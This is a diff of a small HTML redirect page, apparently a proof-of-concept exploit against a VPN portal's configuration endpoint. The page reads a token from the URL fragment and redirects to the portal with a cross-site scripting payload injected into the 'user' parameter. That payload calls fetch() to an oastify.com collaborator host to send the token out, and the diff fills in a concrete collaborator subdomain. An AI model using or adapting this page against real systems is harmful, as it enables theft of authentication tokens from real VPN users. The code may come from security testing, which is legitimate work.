@@ -1,6 +1,14 @@
-<!-- redirect.html -->
-<script>
-  const token = location.hash;
-  location.href = "https://tokyo-1.vpn.adobe.com/ssl-vpn/getconfig.esp?client-type=1&protocol-version=p1&app-version=3.0.1-10&clientos=Linux&os-version=linux-64&hmac-algo=sha1,md5&enc-algo=aes-128-cbc,aes-256-cbc&authcookie=12cea70227d3aafbf25082fac1b6f51d&portal=us-vpn-gw-N&user=%3Csvg%20xmlns='http://www.w3.org/2000/svg'%3E<script>fetch('https://<oastify>.oastify.com?token='+encodeURIComponent(token))</script>%3C/svg%3E&domain=(empty_domain)&computer=computer";
-</script>
-
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Token Redirect</title>
+    <script>
+      const token = location.hash;
+      const payload = "https://tokyo-1.vpn.adobe.com/ssl-vpn/getconfig.esp?client-type=1&protocol-version=p1&app-version=3.0.1-10&clientos=Linux&os-version=linux-64&hmac-algo=sha1,md5&enc-algo=aes-128-cbc,aes-256-cbc&authcookie=12cea70227d3aafbf25082fac1b6f51d&portal=us-vpn-gw-N&user=%3Csvg%20xmlns='http://www.w3.org/2000/svg'%3E<script>fetch('https://5hn71ehv597opdhgtll7lq5cc3iv6lua.oastify.com?token='+encodeURIComponent(token))</script>%3C/svg%3E&domain=(empty_domain)&computer=computer";
+      location.href = payload;
+    </script>
+  </head>
+  <body>
+    Redirecting...
+  </body>
+</html>
